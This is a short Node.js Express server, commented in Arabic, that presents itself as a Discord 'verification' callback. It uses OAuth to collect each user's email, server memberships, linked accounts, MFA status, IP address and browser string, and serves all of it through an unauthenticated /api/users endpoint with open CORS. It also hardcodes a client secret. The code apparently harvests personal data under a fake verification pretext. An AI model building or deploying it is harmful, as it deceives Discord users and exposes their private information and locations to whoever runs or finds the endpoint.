const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());
app.set("trust proxy", true);

/* ===== CONFIG ===== */
const CLIENT_ID = "1456246007858987150";
const CLIENT_SECRET = "TOpGnsPmS_jaNCfEm9IgO3OAf1nJCYol";
const REDIRECT_URI = "https://verify36.netlify.app/callback"; // الرابط اللي Discord يرجع عليه
/* ================== */

let verifiedUsers = [];

/* ========= CALLBACK DISCORD ========= */
app.get("/callback", async (req, res) => {
  try {
    const code = req.query.code;
    if (!code) return res.send("No code");

    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const ua = req.headers["user-agent"];

    // احصل على token
    const tokenRes = await axios.post(
      "https://discord.com/api/oauth2/token",
      new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: "authorization_code",
        code,
        redirect_uri: REDIRECT_URI,
        scope: "identify email guilds connections"
      }),
      { headers: { "Content-Type": "application/x-www-form-urlencoded" } }
    );

    const access = tokenRes.data.access_token;

    // معلومات المستخدم
    const userRes = await axios.get("https://discord.com/api/users/@me", {
      headers: { Authorization: `Bearer ${access}` }
    });

    // السيرفرات
    const guildsRes = await axios.get("https://discord.com/api/users/@me/guilds", {
      headers: { Authorization: `Bearer ${access}` }
    });

    // الاتصالات
    const connectionsRes = await axios.get("https://discord.com/api/users/@me/connections", {
      headers: { Authorization: `Bearer ${access}` }
    });

    verifiedUsers.push({
      id: userRes.data.id,
      username: userRes.data.username,
      discriminator: userRes.data.discriminator,
      email: userRes.data.email,
      locale: userRes.data.locale,
      verified: userRes.data.verified,
      mfa: userRes.data.mfa_enabled,
      flags: userRes.data.flags,
      premium: userRes.data.premium_type,
      avatar: `https://cdn.discordapp.com/avatars/${userRes.data.id}/${userRes.data.avatar}.png`,
      guilds: guildsRes.data,
      connections: connectionsRes.data,
      ip,
      ua
    });

    // ارجع للموقع اللي فيه زر التحقق
    res.redirect("https://verify36.netlify.app/");
  } catch (err) {
    console.error(err.response?.data || err);
    res.send("OAuth Error");
  }
});

/* ========= API لإحضار المستخدمين ========= */
app.get("/api/users", (req, res) => {
  res.json(verifiedUsers);
});

/* ========= START SERVER ========= */
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Admin dashboard API running on port ${PORT}`);
});
